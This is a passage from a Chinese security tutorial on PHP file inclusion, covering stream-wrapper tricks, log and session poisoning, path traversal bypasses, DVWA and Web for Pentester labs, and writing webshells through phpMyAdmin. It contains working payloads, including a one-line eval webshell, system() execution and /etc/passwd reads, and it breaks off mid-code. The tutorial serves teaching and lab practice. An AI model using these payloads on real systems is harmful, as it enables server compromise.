class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="php-filter（文件读取）"><a href="#php-filter（文件读取）" class="headerlink" title="php://filter（文件读取）"></a>php://filter（文件读取）</h2><p>获取指定文件源码，我们一般对其进行编码来读取一些 PHP 源码信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=index.php</span><br><span class="line">?file=php://filter/convert.base64-encode/resource=index.php</span><br><span class="line">?filename=php://filter/convert.iconv.utf-16le.utf-8/resource=flag.php</span><br></pre></td></tr></table></figure><blockquote><p>这里要访问<code>php.php</code>，所以最后改成<code>php.php</code></p></blockquote><p>访问 URL，得到经过 Base64 加密后的字符串:</p><p><img src="http://qiniuyun.lintstar.top/20200803163510.png" alt="20200803163510"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCiAgICAkZmlsZSA9ICRfR0VUWydmaWxlJ107DQogICAgaW5jbHVkZSgkZmlsZSk7DQo/Pg==</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200803163715.png" alt="20200803163715"></p><h2 id="php-input（写入木马）"><a href="#php-input（写入木马）" class="headerlink" title="php://input（写入木马）"></a>php://input（写入木马）</h2><p>使用 php://input 可以获取POST的数据流，如果满足条件也可以直接执行 PHP 语句。</p><p><strong>条件</strong>：</p><ul><li>allow_url_include</li></ul><p>这可以理解成远程文件包含漏洞（RFI），即 POST 过去PHP代码，即可执行。</p><p>如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST["pass"])?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200803163946.png" alt="20200803163946"></p><p>此时木马就已经写入到了 index.php 的同级目录下了：</p><p><img src="http://qiniuyun.lintstar.top/20200803164030.png" alt="20200803164030"></p><p>同理还可以直接命令执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://input</span><br></pre></td></tr></table></figure><p>POST 数据内容如下，来执行命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">'ipconfig'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200803164137.png" alt="20200803164137"></p><h2 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h2><p>类似于php://input，可以让用户来控制输入流，如果和文件包含结合的话，可以将原本的 include 的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，导致可以执行任意 payload</p><p><strong>条件</strong>：</p><ul><li>allow_url_fopen=On</li><li>allow_url_include=On</li><li>PHP &gt; 5.2</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200803162116.png" alt="20200803162116"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 明文</span></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64 编码</span></span><br><span class="line">PD9waHAgcGhwaW5mbygpOz8+</span><br><span class="line"></span><br><span class="line"><span class="comment"># + URL 转码</span></span><br><span class="line">PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200803162247.png" alt="20200803162247"></p><h3 id="蓝帽杯文件包含思路"><a href="#蓝帽杯文件包含思路" class="headerlink" title="蓝帽杯文件包含思路"></a>蓝帽杯文件包含思路</h3><p><a href="https://yanmymickey.github.io/2020/04/17/CTFwp/Phuck2/" target="_blank" rel="noopener">https://yanmymickey.github.io/2020/04/17/CTFwp/Phuck2/</a></p><blockquote><p>?page=data:123/res</p></blockquote><p>当allow_url_include=Off时</p><p>创建的是<code>data:123</code>文件夹下的<code>res</code>文件</p><ul><li><p>file_get_contents在处理data:123/res时会直接处理<code>data:</code>去掉伪协议后再读取<code>123</code>文件夹下的<code>res</code>,而此文件夹不存在</p></li><li><p>include() 函数不认识伪协议,所以会直接包含<code>data:123</code>文件夹下的<code>res</code></p></li></ul><h2 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar://伪协议"></a>phar://伪协议</h2><p>这个参数是就是 PHP 解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。并且相对路径和绝对路径都可以使用。</p><p><strong>条件</strong>：PHP &gt;= 5.3</p><p>文件 payload.txt，其内容为<code>&lt;?php phpinfo();?&gt;</code>，打包成 zip 压缩包，如下：</p><p><img src="http://qiniuyun.lintstar.top/image-20200511103235817.png" alt="image-20200511103235817"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=phar://payload.zip/payload.txt</span><br><span class="line">?file=phar://C:/PhpStudy/PHPTutorial/WWW/<span class="keyword">fi</span>/payload.zip/payload.txt</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200809120406.png" alt="20200809120406"></p><h2 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h2><p>zip 伪协议和phar协议类似，可以访问压缩包里面的文件。但是用法不一样。</p><p><strong>条件</strong>：PHP &gt;= 5.2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用法：</span></span><br><span class="line">?file=zip://[压缩文件绝对路径]<span class="comment">#[压缩文件内的子文件名] zip://xxx.png#shell.php。</span></span><br></pre></td></tr></table></figure><ol><li>需要指定<code>绝对路径</code></li><li><code>#</code> 要注意 URL 编码</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=zip://C:/PhpStudy/PHPTutorial/WWW/<span class="keyword">fi</span>/payload.zip%23payload.txt</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200511103639732.png" alt="image-20200511103639732"></p><p>若是使用相对路径，则会包含失败。</p><h1 id="实战中包含技巧"><a href="#实战中包含技巧" class="headerlink" title="实战中包含技巧"></a>实战中包含技巧</h1><h2 id="包含-HTTP-日志"><a href="#包含-HTTP-日志" class="headerlink" title="包含 HTTP 日志"></a>包含 HTTP 日志</h2><p><strong>条件</strong>：知道服务器日志的存储路径，且日志文件可读。</p><blockquote><p>怎么合法的往服务器写马：利用头像、SSH日志、Web日志、Sessions</p></blockquote><p>常见日志位置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/var/<span class="built_in">log</span>/nginx/access_log</span><br><span class="line">/var/<span class="built_in">log</span>/nginx/errors_log</span><br><span class="line"></span><br><span class="line">/var/<span class="built_in">log</span>/apache/access_log</span><br><span class="line">/var/<span class="built_in">log</span>/apache/error_log</span><br><span class="line"></span><br><span class="line">/var/<span class="built_in">log</span>/apache2/access.log</span><br><span class="line">/var/<span class="built_in">log</span>/apache2/error.log</span><br><span class="line"></span><br><span class="line">/var/<span class="built_in">log</span>/httpd/access.log</span><br><span class="line">/var/<span class="built_in">log</span>/httpd/error.log</span><br><span class="line"></span><br><span class="line">/var/www/logs/error.log</span><br><span class="line">/var/www/logs/access.log</span><br><span class="line"></span><br><span class="line">/apache/logs/error.log</span><br><span class="line">/apache/logs/access.log</span><br><span class="line"></span><br><span class="line">/usr/<span class="built_in">local</span>/apache/logs/access.log</span><br><span class="line">/usr/<span class="built_in">local</span>/apache/logs/error.log</span><br><span class="line"></span><br><span class="line">/usr/<span class="built_in">local</span>/apache2/logs/access.log</span><br><span class="line">/usr/<span class="built_in">local</span>/apache2/logs/error.log</span><br><span class="line"></span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/etc/httpd/logs/error_log</span><br><span class="line"></span><br><span class="line">C:\PhpStudy\PHPTutorial\Apache\logs\access.log</span><br><span class="line">C:\PhpStudy\PHPTutorial\Apache\logs\error.log</span><br></pre></td></tr></table></figure><p>也可以读取配置文件来查找对应的日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/usr/<span class="built_in">local</span>/apache/conf/httpd.conf</span><br><span class="line">/usr/<span class="built_in">local</span>/apache2/conf/httpd.conf</span><br><span class="line">/etc/apache2/apache2.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># nginx -t 测试配置文件是否正确，同时也告诉了配置文件的路径</span></span><br><span class="line">/usr/<span class="built_in">local</span>/etc/nginx/nginx.conf</span><br><span class="line">/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><p>如果可以执行命令的话，也可以手动 find 来查找配置文件信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name nginx.conf</span><br><span class="line">find / -name httpd.conf</span><br></pre></td></tr></table></figure><p>Window 2003 + IIS6.0 日志文件默认放在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\Logfiles</span><br><span class="line">配置文件默认在</span><br><span class="line">C:\Windows\system32\inetsrv\metabase.xml</span><br></pre></td></tr></table></figure><p>IIS 7 日志文件默认在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\logs\LogFiles</span><br></pre></td></tr></table></figure><p>配置文件默认目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\inetsrv\config\applicationHost.config</span><br><span class="line">C:\apache\logs\access.log</span><br><span class="line">C:\Program Files\Apache Group\Apache\logs\access.log</span><br><span class="line">C:\program files\wamp\apache2\logs</span><br><span class="line">C:\wamp\logs</span><br><span class="line">C:\xampp\apache\logs\error.log</span><br><span class="line">C:\apache\logs\error.log</span><br><span class="line">C:\Program Files\Apache Group\Apache\logs\error.log</span><br><span class="line">C:\wamp\apache2\logs</span><br><span class="line">C:\xampp\apache\logs\access.log</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200512155842154.png" alt="image-20200512155842154"></p><p>尝试将敏感信息写入到日志中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.89/&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200512160305574.png" alt="image-20200512160305574"></p><p>但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用 burp 截包后修改。</p><p>然后尝试直接包含日志文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.89/fi/?file=C:\PhpStudy\PHPTutorial\Apache\logs\access.log</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200512161206899.png" alt="image-20200512161206899"></p><h2 id="包含SSH日志"><a href="#包含SSH日志" class="headerlink" title="包含SSH日志"></a>包含SSH日志</h2><p>SSH日志也可以用来进行包含，以为大多数情况下这个日志文件上是可读的。</p><p>默认情况下为 <code>/var/log/auth.log</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@10.211.55.5</span><br></pre></td></tr></table></figure><h2 id="包含用户上传的文件"><a href="#包含用户上传的文件" class="headerlink" title="包含用户上传的文件"></a>包含用户上传的文件</h2><ul><li>用户上传的文件</li></ul><p>常用于图马，图马制作:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy xx.jpg/b+xxx.php/a shell.jpg</span><br></pre></td></tr></table></figure><p><code>b</code> 表示二进制文件 <code>a</code>表示asscii码文件</p><ul><li>临时文件、其他服务的文件</li></ul><h2 id="包含-session"><a href="#包含-session" class="headerlink" title="包含 session"></a>包含 session</h2><p><strong>条件</strong>：session 文件路径已知，且其中内容可控。</p><blockquote><p>linux 常见<code>/etc/passwd</code>  windows常见 <code>windows/win.ini</code></p></blockquote><p>PHP 的 session 文件的保存路径可以在 phpinfo 的 session.save_path 看到：</p><p><img src="http://qiniuyun.lintstar.top/image-20200511104341362.png" alt="image-20200511104341362"></p><p>常见的 php-session 存放位置：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\PhpStudy\PHPTutorial\tmp\tmp\sess_PHPSESSID</span><br><span class="line">/var/lib/php/sessions/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php5/sessions/sess_PHPSESSID</span><br><span class="line">/var/lib/php5/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br><span class="line">session` 的文件名格式为 `sess_[phpsessid]</span><br></pre></td></tr></table></figure><p>有些情况下 phpsessid 在发送的请求的 cookie 字段中也可以看到:</p><p><img src="http://qiniuyun.lintstar.top/16.png" alt="16"></p><p>要包含并利用的话，需要能控制部分 sesssion 文件的内容。暂时没有通用的办法，下方是故意写一个可以控制 Session 内容的 PHP 代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    $username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后浏览器访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x/FI/?username=2333</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200708113048378.png" alt="image-20200708113048378"></p><p>找到这个 session 文件来看看我们是否成功控制了 session 文件的内容了：</p><p><img src="http://qiniuyun.lintstar.top/image-20200708113142357.png" alt="image-20200708113142357"></p><p>那么可以直接往 session 文件里面写 payload 然后配合文件包含：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x/FI/?username=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200708113326644.png" alt="image-20200708113326644"></p><h1 id="DVWA-实战"><a href="#DVWA-实战" class="headerlink" title="DVWA 实战"></a>DVWA 实战</h1><h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，服务器端对page参数没有做任何的过滤跟检查。</p><p>服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">..\..\..\..\..\..\..\windows/win.ini</span><br><span class="line">访问 C:/windows/win.ini</span><br><span class="line">..\../..\../..\../..\../..\../..\../windows/win.ini</span><br><span class="line">?page=http://127.0.0.1/FI/1/payload.txt</span><br></pre></td></tr></table></figure><p>如果服务器对<code>../</code>等做一些过滤的话，可以用一些编码来进行绕过:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">../</span><br><span class="line">%2e%2e%2f</span><br><span class="line">..%2f</span><br><span class="line">%2e%2e/</span><br><span class="line">%252e%252e%252f</span><br><span class="line">..\</span><br><span class="line">%2e%2e%5c</span><br><span class="line">..%5c</span><br><span class="line">%2e%2e\</span><br><span class="line">%252e%252e%255c</span><br></pre></td></tr></table></figure><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"http://"</span>, <span class="string">"https://"</span> ), <span class="string">""</span>, $file );</span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"../"</span>, <span class="string">"..\""</span> ), <span class="string">""</span>, $file );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理</p><p>使用 str_replace 函数替换为空的话，是极其不安全的，因为可以使用双写绕过替换规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...\.\...\.\...\.\...\.\...\.\...\.\...\.\windows\win.ini</span><br></pre></td></tr></table></figure><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"></span><br><span class="line"><span class="comment">//Thepagewewishtodisplay</span></span><br><span class="line">$file=$_GET[<span class="string">'page'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//Inputvalidation</span></span><br><span class="line"><span class="keyword">if</span>(!fnmatch(<span class="string">"file*"</span>,$file)&amp;&amp;$file!=<span class="string">"include.php"</span>)&#123;</span><br><span class="line">   <span class="comment">//Thisisn'tthepagewewant!</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">"ERROR:Filenotfound!"</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///C:/Windows/win.ini</span><br></pre></td></tr></table></figure><blockquote><p><code>file:///c:/windows/system32/cmd.exe</code> 可以沙盒溢出弹出取￥机cmd</p></blockquote><h1 id="Web-for-Pentester-靶场"><a href="#Web-for-Pentester-靶场" class="headerlink" title="Web for Pentester 靶场"></a>Web for Pentester 靶场</h1><h2 id="Example-1-常规"><a href="#Example-1-常规" class="headerlink" title="Example 1 常规"></a>Example 1 常规</h2><p><strong>关键代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">'../header.php'</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">"page"</span>]) &#123;</span><br><span class="line">        <span class="keyword">include</span>($_GET[<span class="string">"page"</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最基础的文件包含，page 变量通过 GET 方式传递值，然后直接被 include 函数包含，下面直接丢 payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/fileincl/example1.php?page=/etc/passwd</span><br></pre></td></tr></table></figure><p>尝试了一下，发现还可以进行远程文件包含：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/fileincl/example1.php?page=http://www.baidu.com/robots.txt</span><br></pre></td></tr></table></figure><h2 id="Example-2-截断"><a href="#Example-2-截断" class="headerlink" title="Example 2 截断"></a>Example 2 截断</h2><p><strong>关键代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">"page"</span>]) &#123;</span><br><span class="line">    $file = $_GET[<span class="string">"page"</span>].<span class="string">".php"</span>;</span><br><span class="line">    <span class="comment">// simulate null byte issue</span></span><br><span class="line">    $file = preg_replace(<span class="string">'/\x00.*/'</span>,<span class="string">""</span>,$file);</span><br><span class="line">        <span class="keyword">include</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>虽然在 page 后面手动添加了 .php 后缀了，但是下面在正则依然是<code>\x00.*</code>谜一样的操作，依然是吧 00 截断以及后面的内容都替换为空，这样间接地帮助我们把 .php 给干掉了，那么就直接丢 payload 吧:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/fileincl/example2.php?page=/etc/passwd%00</span><br></pre></td></tr></table></figure><p>实际上如果进行远程文件包含的话，还可以使用<code>?</code>和<code>#</code>截断，<code>#</code>的 URL 编码就是 <code>%23</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/fileincl/example2.php?page=https://www.baidu.com/robots.txt?</span><br><span class="line">/fileincl/example2.php?page=https://www.baidu.com/robots.txt%23</span><br></pre></td></tr></table></figure><h1 id="phpMyAdmin-综合利用案例"><a href="#phpMyAdmin-综合利用案例" class="headerlink" title="phpMyAdmin 综合利用案例"></a>phpMyAdmin 综合利用案例</h1><h2 id="常用方法-直接写shell"><a href="#常用方法-直接写shell" class="headerlink" title="常用方法 直接写shell"></a>常用方法 直接写shell</h2><p><strong>条件</strong>：MySQL的load_file()开启，知道网站的物理路径</p><ul><li>load_file()</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like <span class="string">'%secure%'</span>;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_auth      | OFF   |</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure><ul><li>物理路径</li></ul><p><img src="http://qiniuyun.lintstar.top/image-20200512121750949.png" alt="image-20200512121750949"></p><p>执行如下语句来写入 shell 文件：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php phpinfo(); ?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'C:\\PhpStudy\\PHPTutorial\\WWW\\fi\\info.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php phpinfo(); ?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'C:/PhpStudy/PHPTutorial/WWW/fi/info.php'</span>;</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200512122004850.png" alt="image-20200512122004850"></p><h2 id="开启日志写-shell"><a href="#开启日志写-shell" class="headerlink" title="开启日志写 shell"></a>开启日志写 shell</h2><p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">'general%'</span>;</span><br><span class="line">+------------------+-----------------------------------------------+</span><br><span class="line">| Variable_name    | Value                                         |</span><br><span class="line">+------------------+-----------------------------------------------+</span><br><span class="line">| general_log      | OFF                                           |</span><br><span class="line">| general_log_file | C:\PhpStudy\PHPTutorial\MySQL\data\GGD2F3.log |</span><br><span class="line">+------------------+-----------------------------------------------+</span><br></pre></td></tr></table></figure><p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p><p>如果可以自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> global general_log = <span class="string">"ON"</span>;</span><br><span class="line"><span class="built_in">set</span> global general_log_file=<span class="string">'C:/PhpStudy/PHPTutorial/WWW/shell.php'</span>;</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200512132444603.png" alt="image-20200512132444603"></p><p>检测是否开启了日志功能：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 